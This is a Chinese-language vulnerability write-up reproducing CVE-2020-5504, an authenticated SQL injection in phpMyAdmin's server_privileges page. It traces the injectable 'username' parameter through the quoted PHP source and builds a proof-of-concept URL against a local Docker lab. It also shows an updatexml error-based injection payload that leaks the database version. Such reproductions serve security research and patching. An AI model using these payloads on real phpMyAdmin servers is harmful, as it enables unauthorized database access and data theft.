<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X1d18acb867af6fec847d66fdfbf3fa55e43bacb"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-5504</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Phpmyadmin </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在用户帐户页面中发现了一个</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入漏洞。创建对此页面的查询时，恶意用户可能会注入自定义</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">来代替其自己的用户名。攻击者必须具有有效的</span><span class="cs8926E06">MySQL</span><span class="cs9C1B1871">帐户才能访问服务器。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpmyadmin &lt;= 5.00</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Phpmyadmin &lt;= 4.94</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">docker</span><span class="cs9C1B1871">一把梭</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6</span></p><p class="cs40DD2BC9"><span class="cs8926E06">`docker run --name myadmin -d --link mysql5.7:db -p 8080:80 phpmyadmin/phpmyadmin:5.0</span></p><h3 class="cs868C439D">
			<a name="溯源和构造poc"><span class="csD6CA00D2">溯源和构造</span><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">下载前一个版本</span><span class="cs8926E06"> 5.0.0</span><span class="cs9C1B1871">的</span><span class="cs8926E06"><a class="cs508254C" href="https://files.phpmyadmin.net/phpMyAdmin/5.0.0/phpMyAdmin-5.0.0-english.zip"><span class="cs1C2E50E7">代码压缩包</span></a></span><span class="cs9C1B1871">后</span><span class="cs8926E06">, </span><span class="cs9C1B1871">打开</span><span class="cs9FB05234">libraries/classes/Server/Privileges.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">来到对应行</span><span class="cs8926E06">.</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (isset($_GET[&#39;validate_username&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql_query = &quot;SELECT * FROM `mysql`.`user` WHERE `User` = &#39;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. $_GET[&#39;username&#39;] . &quot;&#39;;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">省略</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">节省篇幅</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">很显然可以看出注入点是</span><span class="cs9FB05234">$_GET[&#39;username&#39;]</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而需要设置</span><span class="cs9FB05234">$_GET[&#39;validate_username&#39;]</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">往上看</span><span class="cs8926E06">, </span><span class="cs9C1B1871">这段代码位于</span><span class="cs9FB05234">public function getExtraDataForAjaxBehavior</span><span class="cs9C1B1871">函数</span><span class="cs8926E06">.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">搜索上层调用来到</span><span class="cs9FB05234">/server_privileges.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的这段代码</span></p><p class="cs3A447A38"><span class="cs9FB05234">if ($response-&gt;isAjax()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&amp;&amp; empty($_REQUEST[&#39;ajax_page_request&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&amp;&amp; ! isset($_GET[&#39;export&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&amp;&amp; (! isset($_POST[&#39;submit_mult&#39;]) || $_POST[&#39;submit_mult&#39;] != &#39;export&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&amp;&amp; ((! isset($_GET[&#39;initial&#39;]) || $_GET[&#39;initial&#39;] === null</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;|| $_GET[&#39;initial&#39;] === &#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;|| (isset($_POST[&#39;delete&#39;]) &amp;&amp; $_POST[&#39;delete&#39;] === __(&#39;Go&#39;)))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&amp;&amp; ! isset($_GET[&#39;showall&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&amp;&amp; ! isset($_GET[&#39;edit_user_group_dialog&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$extra_data = $serverPrivileges-&gt;getExtraDataForAjaxBehavior(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(isset($password) ? $password : &#39;&#39;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(isset($sql_query) ? $sql_query : &#39;&#39;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(isset($hostname) ? $hostname : &#39;&#39;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(isset($username) ? $username : &#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (! empty($message) &amp;&amp; $message instanceof Message) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$response-&gt;setRequestStatus($message-&gt;isSuccess());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$response-&gt;addJSON(&#39;message&#39;, $message);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$response-&gt;addJSON($extra_data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以发现</span><span class="cs8926E06">if</span><span class="cs9C1B1871">里大部分条件都可控</span><span class="cs8926E06">, </span><span class="cs9C1B1871">除了</span><span class="cs9FB05234">$response-&gt;isAjax()</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function isAjax(): bool</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $this-&gt;_isAjax;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查看构造函数</span></p><p class="cs3A447A38"><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* Creates a new class instance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;private function __construct()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! defined(&#39;TESTSUITE&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$buffer = OutputBuffering::getInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$buffer-&gt;start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;register_shutdown_function([$this, &#39;response&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_header = new Header();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_HTML &nbsp;&nbsp;= &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_JSON &nbsp;&nbsp;= [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_footer = new Footer();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_isSuccess &nbsp;= true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_isDisabled = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;setAjax(! empty($_REQUEST[&#39;ajax_request&#39;]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_CWD = getcwd();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到这条件在于</span><span class="cs9FB05234">$_REQUEST[&#39;ajax_request&#39;]</span><span class="cs9C1B1871">是否为空</span><span class="cs8926E06">.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据上面的几个条件</span><span class="cs8926E06"> </span><span class="cs9C1B1871">我们可以构造出如下最简单的</span><span class="cs8926E06">poc</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1:8080/server_privileges.php?ajax_request=true&amp;validate_username=true&amp;username=test%27%22</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">登陆后</span><span class="cs8926E06">(</span><span class="cs9C1B1871">这个操作需要权限</span><span class="cs8926E06">) </span><span class="cs9C1B1871">尝试访问上面的</span><span class="cs8926E06">url.</span><span class="cs9C1B1871">返回如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;success&quot;:false,&quot;error&quot;:&quot;&lt;div class=\&quot;error\&quot;&gt;&lt;h1&gt;Error&lt;\/h1&gt;&lt;p&gt;&lt;strong&gt;Static analysis:&lt;\/strong&gt;&lt;\/p&gt;&lt;p&gt;1 errors were found during analysis.&lt;\/p&gt;&lt;p&gt;&lt;ol&gt;&lt;li&gt;Ending quote \&quot; was expected. (near \&quot;\&quot; at position 53)&lt;\/li&gt;&lt;\/ol&gt;&lt;\/p&gt;&lt;p&gt;&lt;strong&gt;SQL query:&lt;\/strong&gt; &nbsp;&lt;a href=\&quot;#\&quot; class=\&quot;copyQueryBtn\&quot; data-text=\&quot;SELECT * FROM `mysql`.`user` WHERE `User` = &#39;test&#39;&amp;quot;&#39;;\&quot;&gt;Copy&lt;\/a&gt;\n&lt;a href=\&quot;.\/url.php?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.6%2Fen%2Fselect.html\&quot; target=\&quot;mysql_doc\&quot;&gt;&lt;img src=\&quot;themes\/dot.gif\&quot; title=\&quot;Documentation\&quot; alt=\&quot;Documentation\&quot; class=\&quot;icon ic_b_help\&quot;&gt;&lt;\/a&gt;&lt;a href=\&quot;server_sql.php?sql_query=SELECT+%2A+FROM+%60mysql%60.%60user%60+WHERE+%60User%60+%3D+%27test%27%22%27%3B&amp;amp;show_query=1\&quot;&gt;&lt;span class=\&quot;nowrap\&quot;&gt;&lt;img src=\&quot;themes\/dot.gif\&quot; title=\&quot;Edit\&quot; alt=\&quot;Edit\&quot; class=\&quot;icon ic_b_edit\&quot;&gt;&amp;nbsp;Edit&lt;\/span&gt;&lt;\/a&gt; &nbsp;&nbsp;&nbsp;&lt;\/p&gt;\n&lt;p&gt;\nSELECT * FROM `mysql`.`user` WHERE `User` = &#39;test&#39;&amp;quot;&#39;;\n&lt;\/p&gt;\n&lt;p&gt;\n &nbsp;&nbsp;&nbsp;&lt;strong&gt;MySQL said: &lt;\/strong&gt;&lt;a href=\&quot;.\/url.php?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.6%2Fen%2Ferror-messages-server.html\&quot; target=\&quot;mysql_doc\&quot;&gt;&lt;img src=\&quot;themes\/dot.gif\&quot; title=\&quot;Documentation\&quot; alt=\&quot;Documentation\&quot; class=\&quot;icon ic_b_help\&quot;&gt;&lt;\/a&gt;\n&lt;\/p&gt;\n&lt;code&gt;#1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&amp;quot;&#39;&#39; at line 1&lt;\/code&gt;&lt;br&gt;&lt;\/div&gt;&quot;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">一个</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">报错信息</span><span class="cs8926E06">, </span><span class="cs9C1B1871">说明这个最短</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">生效了</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用的话</span><span class="cs8926E06"> </span><span class="cs9C1B1871">反正都回显了</span><span class="cs8926E06"> </span><span class="cs9C1B1871">直接</span><span class="cs8926E06">updatexml</span><span class="cs9C1B1871">报错注入</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1:8080/server_privileges.php?ajax_request=true&amp;validate_username=true&amp;username=test%27%20and%20(select%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1))%20--%20</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在返回最下面可以看到</span><span class="cs9FB05234">#1105 - XPATH syntax error: &#39;~5.6.46~&#39;</span></p><h3 class="cs868C439D">
			<a name="后言"><span class="csD6CA00D2">后言</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个洞要求一个可以登录的账号才能注入</span><span class="cs8926E06">. , </span><span class="cs9C1B1871">另外这个请求似乎也不需要</span><span class="cs9FB05234">csrf-token</span><span class="cs8926E06">(</span><span class="cs9C1B1871">不过似乎没什么用</span><span class="cs8926E06">)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/7092"><span class="cs4B51D5E4">https://xz.aliyun.com/t/7092</span></a></span></p></body>
</html>
